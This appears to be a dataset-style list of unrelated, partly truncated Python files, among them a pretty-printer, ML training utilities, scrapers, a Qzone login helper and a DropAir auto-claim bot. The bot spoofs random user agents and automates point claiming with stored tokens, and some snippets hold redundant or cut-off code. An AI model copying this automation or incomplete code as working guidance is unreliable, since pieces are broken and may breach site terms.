    "import contextlib\nimport dataclasses\nimport difflib\nimport functools as ft\nimport sys\nimport types\nfrom collections.abc import Callable, Iterable, Sequence\nfrom typing import Any, Generic, NamedTuple, TypeVar, Union, cast, get_args, get_origin\n\nfrom ._doc_utils import doc_obj\nfrom ._wadler_lindig import (\n    AbstractDoc,\n    BreakDoc,\n    ConcatDoc,\n    TextDoc,\n    pformat_doc,\n)\n\n\nclass _WithRepr:\n    def __init__(self, string: str):\n        self.string = string\n\n    def __repr__(self) -> str:\n        return self.string\n\n\ndef array_summary(shape: tuple[int, ...], dtype: str, kind: None | str) -> TextDoc:\n    \"\"\"Summarises an array based on its shape/dtype/kind. (Where 'kind' refers to NumPy\n    vs PyTorch vs JAX etc.)\n\n    **Arguments:**\n\n    - `shape`: a tuple of integers.\n    - `dtype`: a string, for which common dtypes will be contracted (`float -> f`,\n        `uint -> u`, `int -> i`, `complex -> c`)\n    - `kind`: optional. If provided it is written in brackets afterwards.\n\n    **Returns:**\n\n    A [`wadler_lindig.TextDoc`][] with text looking like e.g. `f32[2,3,4](numpy)` for a\n    NumPy array of shape `(2, 3, 4)` and `float32` dtype.\n    \"\"\"\n    short_dtype = (\n        dtype.replace(\"float\", \"f\")\n        .replace(\"uint\", \"u\")\n        .replace(\"int\", \"i\")\n        .replace(\"complex\", \"c\")\n    )\n    short_shape = \",\".join(map(str, shape))\n    out = f\"{short_dtype}[{short_shape}]\"\n    if kind is not None:\n        out = out + f\"({kind})\"\n    return TextDoc(out)\n\n\ndef bracketed(\n    begin: AbstractDoc,\n    docs: Sequence[AbstractDoc],\n    sep: AbstractDoc,\n    end: AbstractDoc,\n    indent: int,\n) -> AbstractDoc:\n    \"\"\"A helper for formatting a 'bracketed' object: tuples, lists, classes, etc, which\n    are all represented in essentially similar ways: a pair of brackets (whether round,\n    square, etc.), a sequence of values in between -- which are indented if laid out in\n    vertical mode, and possibly a name as prefix.\n\n    See the [`(break-group).nest-break` example](./pattern.ipynb) for more on the\n    pattern that this enables.\n\n    **Arguments:**\n\n    - `begin`: appears at the start, before any indent.\n    - `docs:`: a sequence of documents. They will either be laid out horizontally\n        together or vertically together.\n    - `sep`: each element of `docs` will be separated by `sep`.\n    - `end`: appears at the end, after any indent.\n    - `indent`: how much to indent (for [`wadler_lindig.NestDoc`][] to use) when laying\n        out vertically.\n\n    **Returns:**\n\n    A document in `(break-group).nest-break` form.\n\n    !!! example\n\n        Formatting a list, which do not have any name prefix:\n        ```python\n        import wadler_lindig as wl\n\n        wl.bracketed(\n            begin=wl.TextDoc(\"[\"),\n            docs=[wl.pdoc(x) for x in obj],\n            sep=wl.comma,\n            end=wl.TextDoc(\"]\"),\n            indent=indent,\n        )\n        ```\n\n        Formatting a frozenset, which does have a name prefix:\n        ```python\n        import wadler_lindig as wl\n\n        wl.bracketed(\n            begin=wl.TextDoc(\"frozenset({\"),\n            docs=[wl.pdoc(x) for x in obj],\n            sep=wl.comma,\n            end=wl.TextDoc(\"})\"),\n            indent=indent,\n        )\n        ```\n    \"\"\"\n    if len(docs) == 0:\n        return (begin + end).group()\n    else:\n        docs = [x.group() for x in docs]\n        nested = (BreakDoc(\"\") + join(sep, docs).group()).nest(indent) + BreakDoc(\"\")\n        return (begin + nested + end).group()\n\n\ncomma: AbstractDoc = doc_obj(\n    TextDoc(\",\") + BreakDoc(\" \"), \"A shorthand for `TextDoc(',') + BreakDoc(' ')`.\"\n)\n\n\ndef join(sep: AbstractDoc, docs: Sequence[AbstractDoc]) -> AbstractDoc:\n    \"\"\"Concatenates `objs` together separated by `sep`.\n\n    **Arguments:**\n\n    - `sep`: the separate to use.\n    - `docs`: a sequence of documents to join.\n\n    **Returns:**\n\n    `ConcatDoc(docs[0], sep, docs[1], sep, docs[2], ..., sep, docs[-1])`\n    \"\"\"\n    if len(docs) == 0:\n        return ConcatDoc()\n    pieces = [docs[0]]\n    for obj in docs[1:]:\n        pieces.append(sep)\n        pieces.append(obj)\n    return ConcatDoc(*pieces)\n\n\ndef named_objs(pairs: Iterable[tuple[str, Any]], **kwargs) -> list[AbstractDoc]:\n    \"\"\"Formats key-value pairs in the form 'key=value'.\n\n    **Arguments:**\n\n    - `pairs`: an iterable of `(key, value)` pairs.\n    - `**kwargs`: passed on to each `pdoc(value, **kwargs)`\n\n    **Returns:**\n\n    A list of documents `TextDoc(key) + TextDoc(\"=\") + pdoc(value, **kwargs)` for each\n    key-value pair.\n    \"\"\"\n    return [TextDoc(key) + TextDoc(\"=\") + pdoc(value, **kwargs) for key, value in pairs]\n\n\ndef _pformat_list(obj: list, **kwargs) -> AbstractDoc:\n    return bracketed(\n        begin=TextDoc(\"[\"),\n        docs=[pdoc(x, **kwargs) for x in obj],\n        sep=comma,\n        end=TextDoc(\"]\"),\n        indent=kwargs[\"indent\"],\n    )\n\n\ndef _pformat_set(obj: set, **kwargs) -> AbstractDoc:\n    return bracketed(\n        begin=TextDoc(\"{\"),\n        docs=[pdoc(x, **kwargs) ",
    "import json\nimport logging\nimport subprocess\nfrom pathlib import Path\n\nfrom killpy.files import format_size, get_total_size\nfrom killpy.killers.killer import BaseKiller\n\n\nclass PipxKiller(BaseKiller):\n    def list_environments(self):\n        try:\n            result = subprocess.run(\n                [\"pipx\", \"list\", \"--json\"],\n                capture_output=True,\n                text=True,\n                check=True,\n            )\n\n            installed_packages = json.loads(result.stdout)\n\n            packages_with_size = []\n            for package_name, package_data in installed_packages.get(\n                \"venvs\", {}\n            ).items():\n                bin_path = (\n                    package_data.get(\"metadata\", {})\n                    .get(\"main_package\", {})\n                    .get(\"app_paths\", [])[0]\n                    .get(\"__Path__\", \"\")\n                )\n                package_path = Path(bin_path).parent\n                if package_path.exists():\n                    total_size = get_total_size(package_path)\n                    formatted_size = format_size(total_size)\n                    packages_with_size.append(\n                        (package_name, total_size, formatted_size)\n                    )\n\n            return packages_with_size\n\n        except subprocess.CalledProcessError as e:\n            logging.error(\"Error:  %s\", e)\n            return []\n        except Exception as e:\n            logging.error(\"An error occurred:  %s\", e)\n            return []\n        except subprocess.CalledProcessError as e:\n            logging.error(\"Error:  %s\", e)\n            return []\n        except Exception as e:\n            logging.error(\"An error occurred: %s\", e)\n            return []\n\n    def remove_environment(self, env_to_delete):\n        try:\n            subprocess.run(\n                [\"pipx\", \"uninstall\", env_to_delete],\n                check=True,\n            )\n        except subprocess.CalledProcessError as e:\n            logging.error(\"Error: %s\", e)\n",
    "# Copyright (c) Meta Platforms, Inc. and affiliates.\n# All rights reserved.\n\n# This source code is licensed under the license found in the\n# LICENSE file in the root directory of this source tree.\n# --------------------------------------------------------\n# References:\n# DeiT: https://github.com/facebookresearch/deit\n# BEiT: https://github.com/microsoft/unilm/tree/master/beit\n# --------------------------------------------------------\n\nimport builtins\nimport datetime\nimport os\nimport time\nfrom collections import defaultdict, deque\nfrom pathlib import Path\n\nimport torch\nimport torch.distributed as dist\nfrom torch import inf\n\n\nclass SmoothedValue(object):\n    \"\"\"Track a series of values and provide access to smoothed values over a\n    window or the global series average.\n    \"\"\"\n\n    def __init__(self, window_size=20, fmt=None):\n        if fmt is None:\n            fmt = \"{median:.4f} ({global_avg:.4f})\"\n        self.deque = deque(maxlen=window_size)\n        self.total = 0.0\n        self.count = 0\n        # print('0', self.count)\n        self.fmt = fmt\n\n    def update(self, value, n=1):\n        self.deque.append(value)\n        self.count += n\n        # print('3', self.count)\n        self.total += value * n\n\n    def synchronize_between_processes(self):\n        \"\"\"\n        Warning: does not synchronize the deque!\n        \"\"\"\n        if not is_dist_avail_and_initialized():\n            return\n        t = torch.tensor([self.count, self.total], dtype=torch.float64, device='cuda')\n        dist.barrier()\n        dist.all_reduce(t)\n        t = t.tolist()\n        self.count = int(t[0])\n        # print('2', self.count)\n        self.total = t[1]\n\n    @property\n    def median(self):\n        d = torch.tensor(list(self.deque))\n        return d.median().item()\n\n    @property\n    def avg(self):\n        d = torch.tensor(list(self.deque), dtype=torch.float32)\n        return d.mean().item()\n\n    @property\n    def global_avg(self):\n        # print('1', self.count)\n        # if self.count == 0:\n        #     return 0.0  # or any other suitable value\n        return self.total / self.count\n\n    @property\n    def max(self):\n        # if not self.deque:\n        #     return None  # or any other suitable value\n        return max(self.deque)\n\n    @property\n    def value(self):\n        # if not self.deque:\n        #     return None  # or any other suitable value\n        return self.deque[-1]\n\n    def __str__(self):\n        return self.fmt.format(\n            median=self.median,\n            avg=self.avg,\n            global_avg=self.global_avg,\n            max=self.max,\n            value=self.value)\n\n\nclass MetricLogger(object):\n    def __init__(self, delimiter=\"\\t\"):\n        self.meters = defaultdict(SmoothedValue)\n        self.delimiter = delimiter\n\n    def update(self, **kwargs):\n        for k, v in kwargs.items():\n            if v is None:\n                continue\n            if isinstance(v, torch.Tensor):\n                v = v.item()\n            assert isinstance(v, (float, int))\n            self.meters[k].update(v)\n\n    def __getattr__(self, attr):\n        if attr in self.meters:\n            return self.meters[attr]\n        if attr in self.__dict__:\n            return self.__dict__[attr]\n        raise AttributeError(\"'{}' object has no attribute '{}'\".format(\n            type(self).__name__, attr))\n\n    def __str__(self):\n        loss_str = []\n        for name, meter in self.meters.items():\n            loss_str.append(\n                \"{}: {}\".format(name, str(meter))\n            )\n        return self.delimiter.join(loss_str)\n\n    def synchronize_between_processes(self):\n        for meter in self.meters.values():\n            meter.synchronize_between_processes()\n\n    def add_meter(self, name, meter):\n        self.meters[name] = meter\n\n    def log_every(self, iterable, print_freq, header=None):\n        i = 0\n        if not header:\n            header = ''\n        start_time = time.time()\n        end = time.time()\n        iter_time = SmoothedValue(fmt='{avg:.4f}')\n        data_time = SmoothedValue(fmt='{avg:.4f}')\n        space_fmt = ':' + str(len(str(len(iterable)))) + 'd'\n        log_msg = [\n            header,\n            '[{0' + space_fmt + '}/{1}]',\n            'eta: {eta}',\n            '{meters}',\n            'time: {time}',\n            'data: {data}'\n        ]\n        if torch.cuda.is_available():\n            log_msg.append('max mem: {memory:.0f}')\n        log_msg = self.delimiter.join(log_msg)\n        MB = 1024.0 * 1024.0\n        for obj in iterable:\n            data_time.update(time.time() - end)\n            yield obj\n            iter_time.update(time.time() - end)\n            if i % print_freq == 0 or i == len(iterable) - 1:\n                eta_seconds = iter_time.global_avg * (len(iterable) - i)\n                eta_string = str(datetime.timedelta(seconds=int(eta_seconds)))\n                if torch.cuda.is_available():\n                    print(log_msg.format(\n                        i, len(iterable), eta=eta_string,\n          ",
    "while (1>0):\r\n\r\n    morse = {   \"A\": \".- \",\r\n                \"B\": \"-... \",\r\n                \"C\": \"-.-. \",        \r\n                \"D\": \"-.. \",\r\n                \"E\": \". \", \r\n                \"F\": \"..-. \",\r\n                \"G\": \"--. \",\r\n                \"H\": \".... \",\r\n                \"I\": \".. \",\r\n                \"J\": \".--- \",\r\n                \"K\": \"-.- \",\r\n                \"L\": \".-.. \",\r\n                \"M\": \"-- \",\r\n                \"N\": \"-. \",\r\n                \"O\": \"--- \",\r\n                \"P\": \".--. \",\r\n                \"Q\": \"--.- \",\r\n                \"R\": \".-. \",\r\n                \"S\": \"... \",\r\n                \"T\": \"- \",\r\n                \"U\": \"..- \",\r\n                \"V\": \"...- \",\r\n                \"W\": \".-- \",\r\n                \"X\": \"-..- \",\r\n                \"Y\": \"-.-- \",\r\n                \"Z\": \"--.. \",\r\n                \" \": \"/ \",\r\n            \r\n    }\r\n\r\n\r\n    txt =   {   \".- \": \"A\",\r\n                \"-... \": \"B\",\r\n                \"-.-. \": \"C\",        \r\n                \"-.. \": \"D\",\r\n                \". \": \"E\", \r\n                \"..-. \": \"F\",\r\n                \"--. \": \"G\",\r\n                \".... \": \"H\",\r\n                \".. \": \"I\",\r\n                \".--- \": \"J\",\r\n                \"-.- \": \"K\",\r\n                \".-.. \": \"L\",\r\n                \"-- \": \"M\",\r\n                \"-. \": \"N\",\r\n                \"--- \": \"O\",\r\n                \".--. \": \"P\",\r\n                \"--.- \": \"Q\",\r\n                \".-. \": \"R\",\r\n                \"... \": \"S\",\r\n                \"- \": \"T\",\r\n                \"..- \": \"U\",\r\n                \"...- \": \"V\",\r\n                \".-- \": \"W\",\r\n                \"-..- \": \"X\",\r\n                \"-.-- \": \"Y\",\r\n                \"--.. \": \"Z\",\r\n                \"/ \": \" \",\r\n\r\n    }\r\n\r\n\r\n    LAP = []\r\n    RES = []\r\n    TEX = []\r\n\r\n    LAP = input(\"Digite sua frase para transformar em Morse :D\\n(PS: n\u00e3o funcionar\u00e1 com uso de acentos)\\nFrase: \")\r\n    REC = list(LAP.upper())  # Separa em uma lista de caracteres\r\n    \r\n\r\n    rg= len(REC)\r\n\r\n\r\n    for c in range(rg):\r\n\r\n        x= REC[c]\r\n\r\n        RES.append(morse[x])\r\n\r\n\r\n    resultado = ''.join(RES)\r\n    print(resultado)\r\n",
    "\"\"\"\nFile to save aggregated defensive action and possession share data, by both \nplayer ID and team ID, with competition details\n\"\"\"\n\nimport numpy as np\nimport pandas as pd\n\nfrom data.constants import (\n    BUNDESLIGA_TEAMS,\n    LIGUE_1_TEAMS,\n    PREMIER_LEAGUE_TEAMS,\n    SERIE_A_TEAMS,\n)\nfrom sb_data_pipeline.dataclasses import StatsbombPlayerPosition\nfrom sb_data_pipeline.temp_utils import load_player_presence_stats_df\n\n# Load in data\ndef_events_df = pd.read_csv(\"./poss_adjust_project/data/def_events.csv\")\nplayer_df = pd.read_csv(\"./data/statsbomb_players.csv\")\nteam_df = pd.read_csv(\"./data/statsbomb_teams.csv\")\npresence_stats_df = load_player_presence_stats_df()\n\n# Map player position to more general groups\nposition_mapping = {\n    position.statsbomb_position: position.general_position\n    for position in StatsbombPlayerPosition\n}\nposition_group_mapping = {\n    position.statsbomb_position: position.position_group\n    for position in StatsbombPlayerPosition\n}\n\npresence_stats_df[\"general_position\"] = presence_stats_df[\"position\"].map(\n    position_mapping\n)\npresence_stats_df[\"position_group\"] = presence_stats_df[\"position\"].map(\n    position_group_mapping\n)\npresence_stats_df[\"seq_present\"] = presence_stats_df[\"sequences_list\"].apply(\n    lambda x: len(x)\n)\n\n# Need to merge the presence data here to get the general position\npresence_stats_df[\"player_id\"] = presence_stats_df[\"player_id\"].astype(int)\npresence_stats_df[\"team_id\"] = presence_stats_df[\"team_id\"].astype(int)\npresence_stats_df[\"match_id\"] = presence_stats_df[\"match_id\"].astype(float).astype(int)\ndef_events_df = def_events_df.merge(\n    presence_stats_df[[\"match_id\", \"player_id\", \"team_id\", \"general_position\"]]\n)\n\n# Aggregate the data\nagg_def_events_df = (\n    def_events_df.groupby([\"player_id\", \"team_id\", \"general_position\", \"event_type\"])\n    .count()[\"event_id\"]\n    .reset_index()\n)\nagg_def_events_df = (\n    agg_def_events_df.pivot(\n        index=[\"player_id\", \"team_id\", \"general_position\"],\n        columns=\"event_type\",\n        values=\"event_id\",\n    )\n    .fillna(0)\n    .reset_index()\n)\n\nagg_presence_stats_df = (\n    presence_stats_df[\n        [\n            \"player_id\",\n            \"team_id\",\n            \"general_position\",\n            \"mins_played\",\n            \"successful_passes\",\n            \"opp_successful_passes\",\n            \"seq_present\",\n        ]\n    ]\n    .groupby([\"player_id\", \"team_id\", \"general_position\"])\n    .sum()\n    .reset_index(drop=False)\n)\nagg_presence_stats_df = agg_presence_stats_df[\n    agg_presence_stats_df[\"general_position\"] != \"NA\"\n]\n\nagg_presence_stats_df[\"total_pass\"] = (\n    agg_presence_stats_df[\"successful_passes\"]\n    + agg_presence_stats_df[\"opp_successful_passes\"]\n)\nagg_presence_stats_df[\"poss_pct\"] = (\n    agg_presence_stats_df[\"successful_passes\"] / agg_presence_stats_df[\"total_pass\"]\n)\nagg_presence_stats_df[\"player_id\"] = agg_presence_stats_df[\"player_id\"].astype(int)\nagg_presence_stats_df[\"team_id\"] = agg_presence_stats_df[\"team_id\"].astype(int)\n\ncombined_df = (\n    player_df[[\"player_id\", \"player_name\"]]\n    .merge(\n        agg_presence_stats_df[\n            [\n                \"player_id\",\n                \"team_id\",\n                \"general_position\",\n                \"mins_played\",\n                \"poss_pct\",\n                \"seq_present\",\n            ]\n        ]\n    )\n    .merge(agg_def_events_df)\n    .merge(team_df[[\"team_id\", \"team_name\"]])\n)\n\ncombined_df[\"league\"] = np.where(\n    combined_df[\"team_id\"].isin(PREMIER_LEAGUE_TEAMS),\n    \"epl\",\n    np.where(\n        combined_df[\"team_id\"].isin(LIGUE_1_TEAMS),\n        \"ligue_1\",\n        np.where(\n            combined_df[\"team_id\"].isin(BUNDESLIGA_TEAMS),\n            \"bundesliga\",\n            np.where(combined_df[\"team_id\"].isin(SERIE_A_TEAMS), \"serie_a\", \"la_liga\"),\n        ),\n    ),\n)\n\n# Rename the stat columns for ease\naction_rename_dict = {\n    \"CLEARANCE\": \"clear\",\n    \"DUEL\": \"tack\",\n    \"GENERIC:Block\": \"block\",\n    \"GENERIC:Dribbled Past\": \"drib_past\",\n    \"INTERCEPTION\": \"interc\",\n    \"PRESSURE\": \"pressure\",\n}\n\ncombined_df = combined_df.rename(columns=action_rename_dict)\n\n# per 90 the defensive stats\nfor stat_type in action_rename_dict.values():\n    combined_df[f\"{stat_type}_90\"] = combined_df[stat_type] / (\n        combined_df[\"mins_played\"] / 90\n    )\n\ncombined_df[\"sequences_p90\"] = combined_df[\"seq_present\"] / (\n    combined_df[\"mins_played\"] / 90\n)\n\ncombined_df.to_csv(\n    \"./poss_adjust_project/data/aggregated_data_teams_sequences.csv\", index=False\n)\n",
    "import streamlit as st\r\nimport pandas as pd\r\nimport numpy as np\r\nimport joblib\r\n\r\n# Load the trained models and scalers\r\nsvm_model = joblib.load('fish/svm_fish.pkl')\r\nsvm_scaler = joblib.load('fish/svm_scaler_fish.pkl')\r\nperceptron_model = joblib.load('fish/perceptron_fish.pkl')\r\nperceptron_scaler = joblib.load('fish/perceptron_scaler_fish.pkl')\r\n\r\n# Application title\r\nst.title(\"Iwak Prediction\")\r\n# Centered input container\r\n# Model selection\r\nmodel_type = st.selectbox(\"Choose model\", [\"SVM\", \"Perceptron\"])\r\n# Input form\r\nst.header(\"Input Features\")\r\nlength = st.number_input(\"Fish Length (cm)\", min_value=0.0, max_value=100.0, value=10.0, key='length')\r\nweight = st.number_input(\"Fish Weight (g)\", min_value=0.0, max_value=10000.0, value=200.0, key='weight')\r\nw_l_ratio = weight / length if length > 0 else 0\r\n\r\n\r\n# Prediction button\r\nif st.button(\"Predict\"):\r\n    # Prepare the input data\r\n    input_data = pd.DataFrame([[length, weight, w_l_ratio]], columns=['length', 'weight', 'w_l_ratio'])\r\n    \r\n    if model_type == \"SVM\":\r\n        # Scale the input data for SVM model\r\n        scaled_data = svm_scaler.transform(input_data)\r\n        # Make prediction using SVM model\r\n        prediction = svm_model.predict(scaled_data)\r\n    else:\r\n        # Scale the input data for Perceptron model\r\n        scaled_data = perceptron_scaler.transform(input_data)\r\n        # Make prediction using Perceptron model\r\n        prediction = perceptron_model.predict(scaled_data)\r\n    \r\n    # Display prediction\r\n    st.write(\"### Prediction Result\")\r\n    st.write(f\"The predicted species is: **{prediction[0]}**\")\r\n",
    "from .qrcode import QRCodeHandler\nfrom .cookie_handler import CookieHandler,bkn\nfrom loguru import logger\n\nclass QzoneLogin:\n    def __init__(self):\n        self.qr_handler = QRCodeHandler()\n        self.cookie_handler = CookieHandler()\n        self._cookies = None\n        self._skey = None\n        self._qq = None\n        self.bkn = None\n        \n    async def login(self, timeout: int = 120):\n        try:\n            qrsig = await self.qr_handler.generate_qrcode()\n            if not qrsig:\n                return {\"code\": -1, \"msg\": \"\u83b7\u53d6\u4e8c\u7ef4\u7801\u5931\u8d25\"}\n                \n            cookies = await self.cookie_handler.get_cookies(qrsig)\n            if not cookies:\n                return {\"code\": -2, \"msg\": \"\u767b\u5f55\u8d85\u65f6\u6216\u53d6\u6d88\"}\n                \n            self._cookies = cookies\n            self._skey = cookies.get(\"skey\")\n            self._qq = cookies.get(\"uin\")\n            self.bkn = bkn(cookies.get(\"skey\"))\n            \n            return {\"code\": 0, \"msg\": \"\u767b\u5f55\u6210\u529f\", \"cookies\": self._cookies, \"skey\": self._skey, \"qq\": self._qq, \"bkn\": self.bkn}\n            \n        except Exception as e:\n            logger.exception(\"\u767b\u5f55\u8fc7\u7a0b\u53d1\u751f\u9519\u8bef\")\n            return {\"code\": -999, \"msg\": str(e)}",
    "from pandas import DataFrame\nfrom bs4 import BeautifulSoup\nfrom .attendance import getCourseNames\n\ndef getExamSchedule(session):\n    #Get the exam schedule page\n    schedule_page_url = \"https://ecampus.psgtech.ac.in/studzone/ContinuousAssessment/CATestTimeTable\"\n    schedule_page = session.get(schedule_page_url)\n\n    #Get the html of the page\n    schedule_page_soup = BeautifulSoup(schedule_page.text , \"lxml\")\n\n    #Check for presence of schedule content\n    content_flag = schedule_page_soup.find(\"div\",{\"class\":\"Test-card\"})\n\n    if not content_flag:\n        return False\n\n    #Get the html of each exam's content\n    exams_soup = schedule_page_soup.find_all(\"div\",{\"class\":\"text-left\"})\n\n    #Extract exam details and append the records to a list\n    schedule_data = []\n\n    #Set the indices for required data\n    required_indices = [0,2,4]\n\n    #Get the required details of each courses' exam\n    for exam in exams_soup:\n        #Get the html contents of each exam\n        exam_contents = exam.find_all(\"span\",{\"class\":\"sol\"})\n\n        #Get the record of required details and append to schedule data\n        row = []\n        for index in required_indices:\n            row.append(exam_contents[index].text[1:].strip())\n\n        schedule_data.append(row)\n\n    #Map the course codes with course initials and store in list of records\n    course_map = getCourseNames(session)\n\n    for row in schedule_data:\n        row[0] = ''.join( [ row[0], '   -   ', course_map[row[0]] ] )\n\n    #Set the dataframe headers\n    df_headers = [\"COURSE_CODE\",\"DATE\",\"TIME\"]\n\n    #Create and return a dataframe\n    df = DataFrame(schedule_data, columns = df_headers)\n    \n    return df",
    "from aiohttp import (\n    ClientResponseError,\n    ClientSession,\n    ClientTimeout\n)\nfrom colorama import *\nfrom datetime import datetime\nfrom fake_useragent import FakeUserAgent\nimport asyncio, time, json, base64, os, pytz\n\nwib = pytz.timezone('Asia/Jakarta')\n\nclass DropAir:\n    def __init__(self) -> None:\n        self.headers = {\n            \"Accept\": \"*/*\",\n            \"Accept-Language\": \"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\",\n            \"Referer\": \"https://dropair.io/?ref=9S9TD6\",\n            \"Sec-Fetch-Dest\": \"empty\",\n            \"Sec-Fetch-Mode\": \"cors\",\n            \"Sec-Fetch-Site\": \"same-origin\",\n            \"User-Agent\": FakeUserAgent().random\n        }\n\n    def clear_terminal(self):\n        os.system('cls' if os.name == 'nt' else 'clear')\n\n    def log(self, message):\n        print(\n            f\"{Fore.CYAN + Style.BRIGHT}[ {datetime.now().astimezone(wib).strftime('%x %X %Z')} ]{Style.RESET_ALL}\"\n            f\"{Fore.WHITE + Style.BRIGHT} | {Style.RESET_ALL}{message}\",\n            flush=True\n        )\n\n    def welcome(self):\n        print(\n            f\"\"\"\n        {Fore.GREEN + Style.BRIGHT}Auto Claim {Fore.BLUE + Style.BRIGHT}DropAir - BOT\n            \"\"\"\n            f\"\"\"\n        {Fore.GREEN + Style.BRIGHT}Rey? {Fore.YELLOW + Style.BRIGHT}<INI WATERMARK>\n            \"\"\"\n        )\n\n    def format_seconds(self, seconds):\n        hours, remainder = divmod(seconds, 3600)\n        minutes, seconds = divmod(remainder, 60)\n        return f\"{int(hours):02}:{int(minutes):02}:{int(seconds):02}\"\n    \n    def decode_token(self, token: str):\n        try:\n            header, payload, signature = token.split(\".\")\n            decoded_payload = base64.urlsafe_b64decode(payload + \"==\").decode(\"utf-8\")\n            parsed_payload = json.loads(decoded_payload)\n            username = parsed_payload[\"username\"]\n            exp_time = parsed_payload[\"exp\"]\n            return f\"@{username}\", exp_time\n        except Exception as e:\n            return None, None\n    \n    async def user_info(self, token: str, retries=5):\n        url = \"https://dropair.io/api/user\"\n        headers = {\n            **self.headers,\n            \"Cookie\": f\"auth-token={token}\",\n            \"Content-Type\": \"application/json\"\n        }\n        for attempt in range(retries):\n            try:\n                async with ClientSession(timeout=ClientTimeout(total=120)) as session:\n                    async with session.get(url=url, headers=headers) as response:\n                        response.raise_for_status()\n                        return await response.json()\n            except (Exception, ClientResponseError) as e:\n                if attempt < retries - 1:\n                    await asyncio.sleep(5)\n                    continue\n\n                return None\n        \n    async def complete_tasks(self, token: str, task_id: str, retries=5):\n        url = \"https://dropair.io/api/tasks\"\n        data = json.dumps({'taskId':task_id})\n        headers = {\n            **self.headers,\n            \"Cookie\": f\"auth-token={token}\",\n            \"Content-Length\": str(len(data)),\n            \"Content-Type\": \"application/json\"\n        }\n        for attempt in range(retries):\n            try:\n                async with ClientSession(timeout=ClientTimeout(total=120)) as session:\n                    async with session.post(url=url, headers=headers, data=data) as response:\n                        if response.status == 400:\n                            return None\n                        \n                        response.raise_for_status()\n                        return await response.json()\n            except (Exception, ClientResponseError) as e:\n                if attempt < retries - 1:\n                    await asyncio.sleep(5)\n                    continue\n\n                return None\n    \n    async def process_accounts(self, token: str, exp_time: int):\n        exp_time_wib = datetime.fromtimestamp(exp_time, pytz.utc).astimezone(wib).strftime('%x %X %Z')\n        if int(time.time()) > exp_time:\n            self.log(\n                f\"{Fore.CYAN + Style.BRIGHT}Status    :{Style.RESET_ALL}\"\n                f\"{Fore.RED + Style.BRIGHT} Token Expired {Style.RESET_ALL}\"\n            )\n            return\n\n        self.log(\n            f\"{Fore.CYAN + Style.BRIGHT}Status    :{Style.RESET_ALL}\"\n            f\"{Fore.GREEN + Style.BRIGHT} Token Active {Style.RESET_ALL}\"\n            f\"{Fore.MAGENTA + Style.BRIGHT}-{Style.RESET_ALL}\"\n            f\"{Fore.CYAN + Style.BRIGHT} Expired at {Style.RESET_ALL}\"\n            f\"{Fore.WHITE + Style.BRIGHT}{exp_time_wib}{Style.RESET_ALL}\"\n        )\n\n        balance = \"N/A\"\n\n        user = await self.user_info(token)\n        if user:\n            balance = user.get(\"totalPoints\", 0)\n\n        self.log(\n            f\"{Fore.CYAN + Style.BRIGHT}Balance   :{Style.RESET_ALL}\"\n            f\"{Fore.WHITE + Style.BRIGHT} {balance} DROP {Style.RESET_ALL}\"\n        )\n\n        self.log(\n            f\"{Fore.CYAN + Style.BRIGHT}Task Lists:{Style.RESET_ALL}\"\n        )\n",
    "import torch\nimport torch.nn.functional as F\nfrom torch_geometric.nn import GINConv, DenseGINConv\nfrom torch_geometric.utils import to_dense_batch\nfrom torch_geometric.loader import DataLoader\nfrom torch_geometric.datasets import TUDataset\n\n# Local imports\nfrom source.layers.bnpool import BNPool\nfrom source.utils import NormalizeAdjSparse_with_ea\nfrom source.utils.misc import TensorsCache\nfrom source.utils.data import get_train_val_test_datasets\n\n\n### Get the data\ndataset = TUDataset(root=\"data/TUDataset\", name='MUTAG', pre_transform=NormalizeAdjSparse_with_ea())\ntrain_dataset, val_dataset, test_dataset = get_train_val_test_datasets(dataset, seed=777, n_folds=10, fold_id=0)\ntr_dataloader = DataLoader(train_dataset, batch_size=32, shuffle=True)\nval_dataloader = DataLoader(val_dataset, batch_size=32)\ntest_dataloader = DataLoader(test_dataset, batch_size=32)\n\n\n### Model definition\nclass Net(torch.nn.Module):\n    def __init__(self):\n        super().__init__()\n\n        num_features = dataset.num_features\n        num_classes = dataset.num_classes\n        hidden_channels = 64  \n        self.cache = TensorsCache(use_cache=False)\n\n        # First MP layer\n        self.conv1 = GINConv(\n            torch.nn.Sequential(\n                torch.nn.Linear(num_features, hidden_channels),\n                torch.nn.ReLU(),\n                torch.nn.Linear(hidden_channels, hidden_channels),\n            )\n        )\n\n        # BNPool layer\n        self.pool = BNPool(emb_size=hidden_channels)\n\n        # Second MP layer\n        self.conv2 = DenseGINConv(\n            torch.nn.Sequential(\n                torch.nn.Linear(hidden_channels, hidden_channels),\n                torch.nn.ReLU(),\n                torch.nn.Linear(hidden_channels, hidden_channels),\n            )\n        )\n\n        # Readout layer\n        self.lin = torch.nn.Linear(hidden_channels, num_classes)\n\n    def forward(self, x, edge_index, batch=None):\n\n        # First MP layer\n        x = self.conv1(x, edge_index)\n\n        # Transform to dense batch\n        x, mask = to_dense_batch(x, batch)\n        adj = self.cache.get_and_cache_A(edge_index, batch)\n\n        # BNPool layer\n        pos_weight = self.cache.get_and_cache_pos_weight(adj, mask)\n        _, x, adj, _, loss_d = self.pool(x, adj=adj, node_mask=mask,\n                                         pos_weight=pos_weight,\n                                         return_coarsened_graph=True)\n        aux_loss = loss_d['quality'] + loss_d['kl'] + loss_d['K_prior']\n\n        # Second MP layer\n        x = self.conv2(x, adj)\n\n        # Global pooling\n        x = x.mean(dim=1)\n\n        # Readout layer\n        x = self.lin(x)\n\n        return F.log_softmax(x, dim=-1), aux_loss\n\n\n### Model setup\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\nmodel = Net().to(device)\noptimizer = torch.optim.Adam(model.parameters(), lr=5e-4)\n\n\ndef train():\n    model.train()\n    loss_all = 0\n\n    for data in tr_dataloader:\n        data = data.to(device)\n        optimizer.zero_grad()\n        output, aux_loss = model(data.x, data.edge_index, data.batch)\n        loss = F.nll_loss(output, data.y.view(-1)) + aux_loss\n        loss.backward()\n        loss_all += data.y.size(0) * float(loss)\n        optimizer.step()\n    return loss_all / len(dataset)\n\n\n@torch.no_grad()\ndef test(loader):\n    model.eval()\n    correct = 0\n    for data in loader:\n        data = data.to(device)\n        pred = model(data.x, data.edge_index, data.batch)[0].max(dim=1)[1]\n        correct += int(pred.eq(data.y.view(-1)).sum())\n    return correct / len(loader.dataset)\n\n\n### Training loop\nbest_val_acc = test_acc = 0\nfor epoch in range(1, 151):\n    train_loss = train()\n    val_acc = test(val_dataloader)\n    if val_acc > best_val_acc:\n        test_acc = test(test_dataloader)\n        best_val_acc = val_acc\n    print(f'Epoch: 